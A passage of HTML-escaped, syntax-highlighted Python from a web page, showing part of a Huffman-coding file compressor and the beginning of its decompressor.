class=&#34;token keyword&#34;&gt;if&lt;/span&gt; byte &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; frequencies&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            frequencies&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;byte&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        frequencies&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;byte&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    root &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; build_huffman_tree&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;frequencies&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    huffman_codes &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    build_huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    compressed_data &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; byte &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; data&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        compressed_data &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; huffman_codes&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;byte&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;56&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;57&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    padding &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;compressed_data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;58&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    compressed_data &lt;span class=&#34;token operator&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;0&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; padding&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;59&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;60&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;output_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;wb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;61&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# Write frequency information&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;62&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;frequencies&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;63&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; byte&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; freq &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; frequencies&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;items&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;64&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;byte&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;freq &lt;span class=&#34;token operator&#34;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;freq &lt;span class=&#34;token operator&#34;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;freq &lt;span class=&#34;token operator&#34;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; freq &lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0xFF&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;65&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;66&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;# Write compressed data&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;67&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;compressed_data&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;68&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            byte &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; compressed_data&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;69&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;write&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;byte&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;70&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;71&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;72&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;build_huffman_tree_from_bytes&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;frequencies&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;73&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    heap &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;HuffmanNode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;byte&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; freq&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; byte&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; freq &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; frequencies&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;items&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;74&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    heapq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;heapify&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;heap&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;75&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;76&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;heap&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;77&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        left &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; heapq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;heappop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;heap&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;78&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; heapq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;heappop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;heap&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;79&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        merged &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; HuffmanNode&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token boolean&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; left&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;freq &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; right&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;freq&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;80&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        merged&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;left &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; left&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;81&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        merged&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;right &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; right&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;82&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        heapq&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;heappush&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;heap&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; merged&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;83&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;84&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; heap&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;85&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;86&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;decompress&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;input_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; output_file&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;87&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;input_file&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;rb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;as&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;88&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        frequencies_count &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;89&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        frequencies &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;90&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;91&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;for&lt;/span&gt; _ &lt;span class=&#34;token keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;frequencies_count&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;92&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            byte &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;93&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            freq &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;ord&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;f&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;94&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            frequencies&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;byte&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; freq&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;95&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;96&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        root &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; build_huffman_tree_from_bytes&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;frequencies&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;97&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;98&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        huffman_codes &lt;span class=&#34;token 